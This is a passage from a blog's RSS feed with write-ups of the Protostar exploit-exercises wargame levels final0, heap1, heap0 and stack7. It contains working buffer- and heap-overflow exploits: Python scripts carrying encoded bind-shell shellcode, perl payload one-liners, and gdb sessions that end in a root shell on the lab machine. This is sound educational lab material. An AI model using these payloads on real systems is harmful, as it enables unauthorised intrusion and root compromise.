&amp;quot;\x58\xec\x62\x21\xc4\x78\x73\x10\xa4\xf5\x92\xf8\x22\x5e\x98&amp;quot;
&amp;quot;\x7d\x23\x1f\x26\xcd\x37\x10\x40\xfc\xb7\x13\x3d\x98\x7a\x13&amp;quot;
&amp;quot;\xae\x3c\xee\x2b\x89\x73\x6e\x1a\x50\x74\x06\xb2\x8d\xf7\xbe&amp;quot;
&amp;quot;\xa4\xfe\x95\x57\x5b\x88\xb9\xf7\xf0\x03\xdc\x47\xfd\xde\x9f&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I used this shellcode after the return, to generate a basic script:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/python

from socket import *
from struct import *

s = socket(AF_INET, SOCK_STREAM)
s.connect((&amp;quot;localhost&amp;quot;, 2995))

offset = 532
ret = &amp;quot;\xEF\xBE\xAD\xDE&amp;quot;
nop = &amp;quot;\x90&amp;quot;*16
junk = &amp;quot;a&amp;quot;*(offset-len(nop))
junk2 = &amp;quot;\x90&amp;quot; * 12

shellcode = &amp;quot;\xdb\xce\xd9\x74\x24\xf4\xbb\xa3\xc2\x12\x69\x58\x2b\xc9\xb1&amp;quot; \
&amp;quot;\x14\x31\x58\x19\x03\x58\x19\x83\xe8\xfc\x41\x37\x23\xb2\x72&amp;quot; \
&amp;quot;\x5b\x17\x07\x2f\xf6\x9a\x0e\x2e\xb6\xfd\xdd\x30\xec\x5f\x8c&amp;quot; \
&amp;quot;\x58\xec\x62\x21\xc4\x78\x73\x10\xa4\xf5\x92\xf8\x22\x5e\x98&amp;quot; \
&amp;quot;\x7d\x23\x1f\x26\xcd\x37\x10\x40\xfc\xb7\x13\x3d\x98\x7a\x13&amp;quot; \
&amp;quot;\xae\x3c\xee\x2b\x89\x73\x6e\x1a\x50\x74\x06\xb2\x8d\xf7\xbe&amp;quot; \
&amp;quot;\xa4\xfe\x95\x57\x5b\x88\xb9\xf7\xf0\x03\xdc\x47\xfd\xde\x9f&amp;quot;

s.send(nop + junk + ret + junk2 + shellcode)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This script is pretty simple, just getting to the return address, and then adding a nop sled, and the shellcode afterwards.  It just needs to have a return address to the shellcode, which we can then find using gdb.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@protostar:/home/user# gdb --quiet --core=/tmp/core.11.final0.14867 
Core was generated by `/opt/protostar/bin/final0&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0xdeadbeef in ?? ()
(gdb) x/10x 0xbffffcd0
0xbffffcd0: 0x90909090 0x90909090 0x90909090 0x74d9cedb
0xbffffce0: 0xa3bbf424 0x586912c2 0x14b1c92b 0x03195831
0xbffffcf0: 0xe8831958 0x233741fc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It looks safe to use 0xbffffcd0, the start of the nop sled.&lt;/p&gt;

&lt;p&gt;The final script ends up looking like:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/python

from socket import *
from struct import *

s = socket(AF_INET, SOCK_STREAM)
s.connect((&amp;quot;localhost&amp;quot;, 2995))

offset = 532
ret = &amp;quot;\xd0\xfc\xff\xbf&amp;quot; #0xbffffcd0
junk = &amp;quot;a&amp;quot;*offset
nop = &amp;quot;\x90&amp;quot; * 12

#msfpayload linux/x86/shell_bind_tcp R | msfencode -b &#39;\x00\xff\x0d\x0a&#39; -e x86/shikata_ga_nai -t c
shellcode = &amp;quot;\xdb\xce\xd9\x74\x24\xf4\xbb\xa3\xc2\x12\x69\x58\x2b\xc9\xb1&amp;quot; \
&amp;quot;\x14\x31\x58\x19\x03\x58\x19\x83\xe8\xfc\x41\x37\x23\xb2\x72&amp;quot; \
&amp;quot;\x5b\x17\x07\x2f\xf6\x9a\x0e\x2e\xb6\xfd\xdd\x30\xec\x5f\x8c&amp;quot; \
&amp;quot;\x58\xec\x62\x21\xc4\x78\x73\x10\xa4\xf5\x92\xf8\x22\x5e\x98&amp;quot; \
&amp;quot;\x7d\x23\x1f\x26\xcd\x37\x10\x40\xfc\xb7\x13\x3d\x98\x7a\x13&amp;quot; \
&amp;quot;\xae\x3c\xee\x2b\x89\x73\x6e\x1a\x50\x74\x06\xb2\x8d\xf7\xbe&amp;quot; \
&amp;quot;\xa4\xfe\x95\x57\x5b\x88\xb9\xf7\xf0\x03\xdc\x47\xfd\xde\x9f&amp;quot;

s.send(junk + ret + nop + shellcode)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then ran it.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@protostar:/home/user# ./final0_after.py
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And lastly, just like in the other example, I connected to the bind shell.  Since I didn&amp;rsquo;t configure a port number in the msfpayload, the default port number is 4444.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@protostar:/home/user# nc localhost 4444
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There&amp;rsquo;s root access.  Challenge complete.&lt;/p&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;It turns out there is always more than one way to skin a cat.  I&amp;rsquo;m learning the same applies to exploit development.  One could try to make this portable by doing relative jumps with offsets, and ret2libc.  I did not do this, as it wasn&amp;rsquo;t specifically part of the exercise. However, I may come back to it later for fun.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Heap 1</title>
      <link>http://test.andreko.net/2012/01/12/exploit-exercises---protostar-heap-1/</link>
      <pubDate>Thu, 12 Jan 2012 18:28:00 -0500</pubDate>
      
      <guid>http://test.andreko.net/2012/01/12/exploit-exercises---protostar-heap-1/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://exploit-exercises.com/protostar/heap1&#34;&gt;This&lt;/a&gt; challenge was different for me. The previous heap challenge was easy to pretend it was just a simple stack overflow.  This one worked very different, and brought some different challenges with it.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;You first start out with the following code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;



struct internet {
 int priority;
 char *name;
};

void winner()
{
 printf(&amp;quot;and we have a winner @ %d\n&amp;quot;, time(NULL));
}

int main(int argc, char **argv)
{
 struct internet *i1, *i2, *i3;

 i1 = malloc(sizeof(struct internet));
 i1-&amp;gt;priority = 1;
 i1-&amp;gt;name = malloc(8);

 i2 = malloc(sizeof(struct internet));
 i2-&amp;gt;priority = 2;
 i2-&amp;gt;name = malloc(8);

 strcpy(i1-&amp;gt;name, argv[1]);
 strcpy(i2-&amp;gt;name, argv[2]);

 printf(&amp;quot;and that&#39;s a wrap folks!\n&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It&amp;rsquo;s quite easy to see where the heap overflow would occur.  The code is allocating 8 bytes of space for the &amp;ldquo;name&amp;rdquo; field in memory.  However, it&amp;rsquo;s never checking if the arguments are over 8 bytes long.&lt;/p&gt;

&lt;p&gt;After tinkering for a bit, I found that if you passed strings that were too long, you could get strcpy to try overwriting other memory spaces than it was supposed to.  GDB would fail on the lines of strcpy with weird addresses.  So I started there.&lt;/p&gt;

&lt;p&gt;First, I figured I needed to know the offset for the first argument, to know which exact byte it was using as a copy destination.  Just like in stack overflows, I used the &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit Framework&lt;/a&gt; to generate a unique string:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_create.rb 250
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then fed that string into the first argument, and passed a test value of &amp;ldquo;BBBBBBBB&amp;rdquo; as the second argument.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb ./heap1 --quiet
Reading symbols from /opt/protostar/bin/heap1...done.
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A BBBBBBBB
Starting program: /opt/protostar/bin/heap1 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A BBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
*__GI_strcpy (dest=0x37614136 &amp;lt;Address 0x37614136 out of bounds&amp;gt;,
    src=0xbffff99e &amp;quot;BBBBBBBB&amp;quot;) at strcpy.c:40
40      strcpy.c: No such file or directory.
        in strcpy.c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I used the &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit Framework&lt;/a&gt; again to get me the offset using the value in the strcpy dest field.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_offset.rb 0x37614136
20
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So what I had learned here, is if I overflowed the &amp;ldquo;name&amp;rdquo; field of the struct with 20 bytes instead of 8, I could then control the destination of the copy for the second strcpy command.  It would copy whatever the second argument was, into any memory space I wanted.  But I needed to control flow of the program to get &amp;ldquo;winner()&amp;rdquo; to execute.  Somehow I needed to get the address of &amp;ldquo;winner()&amp;rdquo; into the EIP.  My thought on that, was that since when you call a program or function, it puts the return address in the stack, that maybe I could overwrite that return address, and instead of exiting gracefully (because it was the main function), it would put my address into the EIP and run it.  The first step with that was finding the location of that return address in the stack.&lt;/p&gt;

&lt;p&gt;I added a breakpoint to the main function, so I could get the initial memory values once inside that function.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb ./heap1 --quiet
Reading symbols from /opt/protostar/bin/heap1...done.
(gdb) break main
Breakpoint 1 at 0x80484c2: file heap1/heap1.c, line 23.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then ran the program with dummy data, which made me hit my breakpoint.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) run asdf asdf
Starting program: /opt/protostar/bin/heap1 asdf asdf

Breakpoint 1, main (argc=3, argv=0xbffff864) at heap1/heap1.c:23
23      heap1/heap1.c: No such file or directory.
        in heap1/heap1.c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From this point, I wanted to look at all the registers, but focus in on the esp and ebp.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) i r
eax            0xbffff864       -1073743772
ecx            0x7825cdc2       2015743426
edx            0x3      3
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff790       0xbffff790
ebp            0xbffff7b8       0xbffff7b8
esi            0x0      0
edi            0x0      0
eip            0x80484c2        0x80484c2 &amp;lt;main+9&amp;gt;
eflags         0x200286 [ PF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The important parts here, are that the top of the stack is at 0xbffff790 and the bottom at 0xbffff7b8.  So I pulled up all the memory inbetween those two addresses.  I expected to see 0x00000000 at the end, to signify that it was the end of the function.  And in the addresses before that, one would be the return address.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) x/10x $esp
0xbffff790:     0xb7fd8304      0xb7fd7ff4      0x08048580      0xbffff7b8
0xbffff7a0:     0xb7ec6365      0xb7ff1040      0x0804858b      0xb7fd7ff4
0xbffff7b0:     0x08048580      0x00000000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;For now, I removed my original breakpoint, so that execution wouldn&amp;rsquo;t get paused.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) delete 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I played around with the different addresses in this 0xbffff790-0xbffff7b8 range, and found the address 0xbffff7ac to work out.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) run $(perl -e &#39;print &amp;quot;A&amp;quot;x20 . &amp;quot;\xac\xf7\xff\xbf&amp;quot; . &amp;quot; &amp;quot; . &amp;quot;\xEF\xBE\xAD\xDE&amp;quot;&#39;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap1 $(perl -e &#39;print &amp;quot;A&amp;quot;x20 . &amp;quot;\xac\xf7\xff\xbf&amp;quot; . &amp;quot; &amp;quot; . &amp;quot;\xEF\xBE\xAD\xDE&amp;quot;&#39;)
and that&#39;s a wrap folks!

Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So it appears that it wasn&amp;rsquo;t the byte right before the 0x00000000, but was actually 2 bytes before it.  I was now controlling the EIP.  The last step would be to find the address of the winner() function, to get it called.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) print winner
$1 = {void (void)} 0x8048494 &amp;lt;winner&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This was fairly trivial to do.  So I built up the string with the proper return address and winner() address:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) run $(perl -e &#39;print &amp;quot;A&amp;quot;x20 . &amp;quot;\xac\xf7\xff\xbf&amp;quot; . &amp;quot; &amp;quot; . &amp;quot;\x94\x84\x04\x08&amp;quot;&#39;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap1 $(perl -e &#39;print &amp;quot;A&amp;quot;x20 . &amp;quot;\xac\xf7\xff\xbf&amp;quot; . &amp;quot; &amp;quot; . &amp;quot;\x94\x84\x04\x08&amp;quot;&#39;)
and that&#39;s a wrap folks!
and we have a winner @ 1326098464

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It looks like it did execute winner() successfully.  It may not have ended the program properly, but we got our execution.  Just to make sure that it&amp;rsquo;d work outside of gdb, I tried it again on the direct program.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./heap1 $(perl -e &#39;print &amp;quot;A&amp;quot;x20 . &amp;quot;\xac\xf7\xff\xbf&amp;quot; . &amp;quot; &amp;quot; . &amp;quot;\x94\x84\x04\x08&amp;quot;&#39;)
and we have a winner @ 1326098505
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There you have it.  The execution was changed to execute where originally not intended.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Heap 0</title>
      <link>http://test.andreko.net/2012/01/10/exploit-exercises---protostar-heap-0/</link>
      <pubDate>Tue, 10 Jan 2012 05:34:00 -0500</pubDate>
      
      <guid>http://test.andreko.net/2012/01/10/exploit-exercises---protostar-heap-0/</guid>
      <description>&lt;p&gt;Now that I&amp;rsquo;ve completed all of the Stack section of protostar, I&amp;rsquo;ve started to move onto Heap.  The first of these challenges, is &lt;a href=&#34;http://exploit-exercises.com/protostar/heap0&#34;&gt;Heap 0&lt;/a&gt;.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;We are given the following code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;

struct data {
 char name[64];
};

struct fp {
 int (*fp)();
};

void winner()
{
 printf(&amp;quot;level passed\n&amp;quot;);
}

void nowinner()
{
 printf(&amp;quot;level has not been passed\n&amp;quot;);
}

int main(int argc, char **argv)
{
 struct data *d;
 struct fp *f;

 d = malloc(sizeof(struct data));
 f = malloc(sizeof(struct fp));
 f-&amp;gt;fp = nowinner;

 printf(&amp;quot;data is at %p, fp is at %p\n&amp;quot;, d, f);

 strcpy(d-&amp;gt;name, argv[1]);

 f-&amp;gt;fp();

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I first needed to find the offset to where I could overwrite the EIP, so I connected to my other machine with the &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit Framework&lt;/a&gt; installed, and generated a unique string.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_create.rb 250
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then used this string as the input to the heap0 executable.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb ./heap0 --quiet
Reading symbols from /home/user/heap0...done.
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A
Starting program: /home/user/heap0 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A
data is at 0x804a008, fp is at 0x804a050

Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()
(gdb) print winner
$1 = {void (void)} 0x8048464 &amp;lt;winner&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Notice that we see the EIP is 0x41346341.  Additionally while I was debugging, I also got the address of the &amp;ldquo;winner&amp;rdquo; function, since I will want to redirect to that later.  It was at 0x08048464.&lt;/p&gt;

&lt;p&gt;I then connected to my &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit Framework&lt;/a&gt; enabled machine to calculate the offset.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_offset.rb 0x41346341
72
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then simply used perl to create an argument for the heap0 executable with 72 &amp;ldquo;A&amp;rdquo;s for spacing, and passing the address of the &amp;ldquo;winner&amp;rdquo; function in little-endian format to it.  It then succeeded.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./heap0 `perl -e &#39;print &amp;quot;A&amp;quot;x72 . &amp;quot;\x64\x84\x04\x08&amp;quot;&#39;`
data is at 0x804a008, fp is at 0x804a050
level passed
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Stack 7</title>
      <link>http://test.andreko.net/2012/01/09/exploit-exercises---protostar-stack-7/</link>
      <pubDate>Mon, 09 Jan 2012 18:36:00 -0500</pubDate>
      
      <guid>http://test.andreko.net/2012/01/09/exploit-exercises---protostar-stack-7/</guid>
      <description>&lt;p&gt;Welcome everyone to 2012! I took a bit of a break during these holidays, and am just starting to get back going.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://exploit-exercises.com/protostar/stack7&#34;&gt;This challenge&lt;/a&gt; was very interesting to me.  I figured it would build off of the previous one.  However, it was its own standalone challenge.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;We are given the following code to the stack7 executable:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

char *getpath()
{
 char buffer[64];
 unsigned int ret;

 printf(&amp;quot;input path please: &amp;quot;); fflush(stdout);

 gets(buffer);

 ret = __builtin_return_address(0);

 if((ret &amp;amp;amp; 0xb0000000) == 0xb0000000) {
  printf(&amp;quot;bzzzt (%p)\n&amp;quot;, ret);
  _exit(1);
 }

 printf(&amp;quot;got path %s\n&amp;quot;, buffer);
 return strdup(buffer);
}

int main(int argc, char **argv)
{
 getpath();



}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From tinkering with the stack7 executable, I knew I was going to do a stack overflow, and somehow needed to execute code from the stack.  However, similar to the previous challenge, there was a filter on my return address, making it so I couldn&amp;rsquo;t just jump to an address in the stack.  This meant figuring out a way around it.&lt;/p&gt;

&lt;p&gt;Using the note about this being a &amp;ldquo;return to .text&amp;rdquo; exploit, I started reading up.  This is a type of exploit that uses part of the executable, albeit even a string to execute as code, because the same characters are also x86 assembler instructions.  So I went about trying to find some code that would let me essentially, &amp;ldquo;jmp esp&amp;rdquo;, or jump to the stack pointer, where I would put my shellcode.  To do this, I did the following:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:~$ msfelfscan -j esp stack7
[stack7]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This was disappointing.  At first, I thought maybe I was not using msfelfscan correctly, and had to tinker a bit.  But it just turns out, that there is no &amp;ldquo;jmp esp&amp;rdquo; in stack7.  What a bummer.  However, on a whim, I tried to see if maybe another option to msfelfscan would work:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:~$ msfelfscan -p stack7
[stack7]
0x08048492 pop ebx; pop ebp; ret
0x080485c7 pop edi; pop ebp; ret
0x080485f7 pop ebx; pop ebp; ret
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is great! Some results!  Now let&amp;rsquo;s just pick one, and attempt to use it as the return address in our overflow.  I found that the EIP offset was 80 bytes, so I wired it up as so, and debugged it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ perl -e &#39;print &amp;quot;A&amp;quot;x80 . &amp;quot;\x92\x84\x04\x08&amp;quot; . &amp;quot;C&amp;quot;x100&#39; &amp;gt; /home/user/file
user@protostar:~$ gdb ./stack7 --quiet
Reading symbols from /home/user/stack7...done.
(gdb) run &amp;lt; file
Starting program: /home/user/stack7 &amp;lt; file
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒AAAAAAAAAAAA▒CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is a good sign.  It is overwriting the EIP now with &amp;ldquo;C&amp;rdquo; values (0x43).  So now we just need to know where in the 100 &amp;ldquo;C&amp;rdquo;s the return address is going to.  To do that, I did similar process to finding an EIP offset:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_create.rb 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

user@protostar:~$ perl -e &#39;print &amp;quot;A&amp;quot;x80 . &amp;quot;\x92\x84\x04\x08&amp;quot; . &amp;quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&amp;quot;&#39; &amp;gt; /home/user/file

user@protostar:~$ gdb ./stack7 --quiet
Reading symbols from /home/user/stack7...done.
(gdb) run &amp;lt; file
Starting program: /home/user/stack7 &amp;lt; file
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒AAAAAAAAAAAA▒Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x33614132 in ?? ()

mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_offset.rb 0x33614132
8
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I simply generated a unique string using pattern_create.rb to replace the 100 &amp;ldquo;C&amp;rdquo;s, and then used pattern_offset.rb to tell me the offset when gdb got a segmentation fault.  So now I know that the first 8 &amp;ldquo;C&amp;rdquo;s are just junk.  Just to verify this, I ran it again, a little differently:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ perl -e &#39;print &amp;quot;A&amp;quot;x80 . &amp;quot;\x92\x84\x04\x08&amp;quot; . &amp;quot;C&amp;quot;x8 . &amp;quot;D&amp;quot;x8 . &amp;quot;E&amp;quot;x100&#39; &amp;gt; file
user@protostar:~$ gdb ./stack7 --quiet
Reading symbols from /home/user/stack7...done.
(gdb) run &amp;lt; file
Starting program: /home/user/stack7 &amp;lt; file
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒AAAAAAAAAAAA▒CCCCCCCCDDDDDDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE

Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This shows the 4 &amp;ldquo;D&amp;rdquo;s were properly placed, which proved to me that I was indeed going to need my buffer to look like:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;| 80 bytes junk | pop-pop-ret | 8 bytes junk | address to execute |
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Since it was actually going to execute the instructions at the last dword, I opted to put my shellcode in an environmental variable, since it was easy.  I again used the same &lt;a href=&#34;http://www.exploit-db.com/exploits/13357&#34;&gt;shellcode&lt;/a&gt; for dealing with gets() as I have in the last couple challenges:&lt;/p&gt;

